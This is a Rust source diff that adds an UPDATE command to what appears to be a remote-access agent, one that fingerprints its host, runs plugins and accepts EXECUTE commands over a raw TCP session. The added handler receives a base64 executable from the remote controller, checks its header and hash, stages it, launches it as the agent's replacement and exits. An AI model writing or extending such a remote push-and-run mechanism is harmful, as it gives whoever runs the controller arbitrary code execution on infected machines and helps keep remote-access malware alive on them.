@@ -5,7 +5,7 @@ use std::{
     time::Duration,
 };
 
-use crate::{plugin::Manager, sys, telemetry, text};
+use crate::{plugin::Manager, sys, telemetry, text, update};
 
 pub fn run(ip: &str, port: u16) {
     let fp = telemetry::fingerprint();
@@ -102,6 +102,66 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
                         let _ = send(stream, &format!("{}{}{}", text::ACK, text::PEVENT, event));
                     }
                     continue;
+                }
+
+                if raw.to_ascii_uppercase().starts_with(text::UPDATE) {
+                    let rest = raw[text::UPDATE.len()..].trim();
+                    let (expected_hash, b64) = match rest.split_once(':') {
+                        Some((h, b)) => (h.trim(), b.trim()),
+                        None => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                            continue;
+                        }
+                    };
+
+                    let bytes = match update::decode_base64(b64) {
+                        Some(bytes) if !bytes.is_empty() && bytes.len() <= update::max_update_bytes() => bytes,
+                        _ => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                            continue;
+                        }
+                    };
+                    #[cfg(windows)]
+                    if bytes.len() < 2 || &bytes[..2] != b"MZ" {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                        continue;
+                    }
+
+                    let actual_hash = update::sha256_hex(&bytes);
+                    if !update::validate_hash(expected_hash, &actual_hash) {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                        continue;
+                    }
+
+                    let staged = match update::stage_bytes(&bytes, expected_hash) {
+                        Ok(path) => path,
+                        Err(_) => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                            continue;
+                        }
+                    };
+
+                    let current_exe = match std::env::current_exe() {
+                        Ok(path) => path,
+                        Err(_) => {
+                            let _ = std::fs::remove_file(staged);
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                            continue;
+                        }
+                    };
+                    let parent_pid = std::process::id();
+                    let target = current_exe;
+                    let hash = actual_hash;
+
+                    if update::spawn_successor(staged, target, hash, parent_pid).is_err() {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                        continue;
+                    }
+
+                    if send(stream, &format!("{}{}", text::ACK, text::UPDATE)).is_ok() {
+                        std::process::exit(0);
+                    }
+                    return true;
                 }
 
                 if raw.to_ascii_uppercase().starts_with(text::EXECUTE) {
